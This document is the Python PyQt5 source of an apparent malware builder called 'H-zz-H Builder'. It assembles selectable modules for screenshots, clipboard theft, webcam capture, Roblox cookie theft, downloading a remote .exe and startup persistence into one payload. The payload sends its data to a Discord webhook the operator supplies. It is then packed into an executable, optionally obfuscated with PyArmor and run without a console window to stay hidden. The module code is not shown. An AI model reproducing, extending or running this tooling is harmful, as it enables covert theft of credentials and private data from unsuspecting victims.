import sys, os, subprocess
from PyQt5.QtWidgets import (QApplication, QInputDialog, QWidget, QVBoxLayout, QHBoxLayout, QLabel, QPushButton, QComboBox, QMessageBox, QCheckBox, QScrollArea, QGridLayout)
from PyQt5.QtCore import Qt

class BuilderApp(QWidget):
    modules = [
        ("sysinfo.py", "System Information", "Gathers system details like OS, CPU, RAM"),
        ("screenshot.py", "Screenshot", "Takes screenshots of the desktop"),
        ("clipboard.py", "Clipboard", "Sends clipboard data"),
        ("webcam.py", "Webcam", "Takes webcam snapshots"),
        ("autodownload.py", "Add Download", "Auto downloads files from a URL"),
        ("Roblox.py", "Roblox", "Get Roblox Cookies"),
        ("startup.py", "StartUp", "Automatically runs on system startup"),
    ]
    def __init__(self):
        super().__init__()
        self.setWindowTitle("H-zz-H Builder")
        self.setGeometry(100, 100, 700, 500)
        self.mods_path, self.build_path = "options", "build"
        self.setup_ui()
        self.setStyleSheet("""
            QWidget {background-color: #121212; color: #FFF; font-size: 14px;}
            QLabel {font-weight: bold;}
            QPushButton {background-color: #6200EE; color: white; border-radius: 5px; padding: 7px; font-weight: bold;}
            QPushButton:hover {background-color: #3700B3;}
            QComboBox {background-color: #333; border: 1px solid #555; border-radius: 5px; padding: 3px; color: white; min-width: 120px;}
            QComboBox:hover {border-color: #6200EE;}
            QCheckBox {spacing: 5px; padding: 2px;}
            QCheckBox::indicator {width: 18px; height: 18px; border-radius: 3px; border: 2px solid #6200EE; background: #333;}
            QCheckBox::indicator:checked {background-color: #6200EE; border: 2px solid #3700B3;}
            QScrollArea {border: none;}
        """)
    def setup_ui(self):
        layout = QVBoxLayout(self)
        layout.addWidget(QLabel("Select modules to include in build:"))
        scroll = QScrollArea(); scroll.setWidgetResizable(True)
        cont = QWidget(); grid = QGridLayout(cont)
        self.module_checkboxes = []
        for i, (fname, name, tip) in enumerate(self.modules):
            cb = QCheckBox(); cb.setToolTip(tip)
            if fname == "autodownload.py":
                def on_toggle(state, cb=cb):
                    if state == Qt.Checked:
                        url, ok = QInputDialog.getText(self, "Enter Download URL", "Enter URL ending with .exe:")
                        if ok and url.lower().endswith(".exe"):
                            try:
                                import re
                                p = os.path.join("options", "autodownload.py")
                                with open(p, "r", encoding="utf-8") as f: c = f.read()
                                c = re.sub(r'dwnld\s*=\s*["\"].*?["\"]', f'dwnld = "{url}"', c)
                                with open(p, "w", encoding="utf-8") as f: f.write(c)
                                QMessageBox.information(self, "URL saved", f"Download URL set to:\n{url}")
                            except Exception as e:
                                QMessageBox.critical(self, "Error", f"Failed to update autodownload.py:\n{e}"); cb.setChecked(False)
                        else: cb.setChecked(False)
                cb.stateChanged.connect(on_toggle)
            w = QWidget(); l = QHBoxLayout(w); l.setContentsMargins(0,0,0,0); l.addWidget(QLabel(name)); l.addWidget(cb)
            self.module_checkboxes.append((cb, fname)); grid.addWidget(w, i//3, i%3)
        scroll.setWidget(cont); layout.addWidget(scroll)
        out = QHBoxLayout(); out.addWidget(QLabel("Output type:"))
        self.output_type_combo = QComboBox(); self.output_type_combo.addItems([".exe", ".py"]); self.output_type_combo.currentIndexChanged.connect(self.output_type_changed)
        out.addWidget(self.output_type_combo); out.addSpacing(20); out.addWidget(QLabel("Mode:"))
        self.mode_combo = QComboBox(); self.mode_combo.addItems(["Console", "No Console"]); out.addWidget(self.mode_combo); out.addStretch(); layout.addLayout(out)
        build_mode = QHBoxLayout(); build_mode.addWidget(QLabel("Build mode:"))
        self.build_mode_combo = QComboBox(); self.build_mode_combo.addItems(["PyInstaller", "PyArmor", "Nuitka"]); build_mode.addWidget(self.build_mode_combo); build_mode.addStretch(); layout.addLayout(build_mode)
        self.build_btn = QPushButton("Build"); self.build_btn.clicked.connect(self.build); layout.addWidget(self.build_btn)
        self.output_type_changed()
    def output_type_changed(self):
        self.mode_combo.setEnabled(self.output_type_combo.currentText() != ".py")
    def build(self):
        mods = [fname for cb, fname in self.module_checkboxes if cb.isChecked()]
        if not mods: return QMessageBox.warning(self, "No modules selected", "Please select at least one module to build.")
        if not os.path.exists(self.mods_path): return QMessageBox.warning(self, "Missing folder", f"The folder '{self.mods_path}' does not exist.")
        if not os.path.exists(self.build_path): os.makedirs(self.build_path)
        name, ext, mode, packer = "hzzh_build", self.output_type_combo.currentText(), self.mode_combo.currentText(), self.build_mode_combo.currentText()
        out_path = os.path.join(self.build_path, name + (".exe" if ext == ".exe" else ".py"))
        temp_py = os.path.join(self.build_path, name + "_build.py")
        webhook, ok = QInputDialog.getText(self, "Webhook URL", "Enter the Discord webhook URL (leave empty if none):")
        if not ok: return QMessageBox.information(self, "Build cancelled", "Build cancelled by user.")
        webhook_line = f'webh = "{webhook.strip()}"\n\n' if webhook.strip() else ""
        try:
            src = webhook_line
            for m in mods:
                p = os.path.join(self.mods_path, m)
                if not os.path.isfile(p): return QMessageBox.warning(self, "File missing", f"Module file not found: {p}")
                with open(p, "r", encoding="utf-8") as f: src += f"# Module: {m}\n" + f.read() + "\n\n"
            with open(temp_py, "w", encoding="utf-8") as f: f.write(src)
        except Exception as e:
            return QMessageBox.critical(self, "Error", f"Failed preparing build source:\n{e}")
        if ext == ".py":
            try:
                import shutil
                shutil.copy(temp_py, out_path)
                QMessageBox.information(self, "Success", f"Saved Python file:\n{out_path}")
                os.remove(temp_py)
                return
            except Exception as e:
                return QMessageBox.critical(self, "Error", f"Failed saving .py file:\n{e}")
        cmd = []
        if packer == "PyInstaller":
            cmd = ["pyinstaller", "--onefile", temp_py, "--distpath", self.build_path, "--name", name]
            if mode == "No Console": cmd.append("--noconsole")
        elif packer == "PyArmor":
            cmd = ["pyarmor", "pack", "-e", f'--onefile {"--noconsole" if mode == "No Console" else ""}', temp_py]
        elif packer == "Nuitka":
            cmd = ["python", "-m", "nuitka", "--onefile", temp_py, f"--output-dir={self.build_path}", f"--output-filename={name}.exe"]
            if mode == "No Console": cmd.append("--windows-disable-console")
        else: return QMessageBox.warning(self, "Error", "Unknown build mode.")
        try:
            proc = subprocess.run(cmd, capture_output=True, text=True, shell=True)
            if proc.returncode == 0:
                QMessageBox.information(self, "Success", f"Build succeeded!\nOutput: {out_path}")
                os.remove(temp_py)
            else:
                QMessageBox.critical(self, "Build failed", proc.stderr)
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed running build command:\n{e}")
def main():
    app = QApplication(sys.argv)
    window = BuilderApp(); window.show(); sys.exit(app.exec_())
if __name__ == "__main__": main()
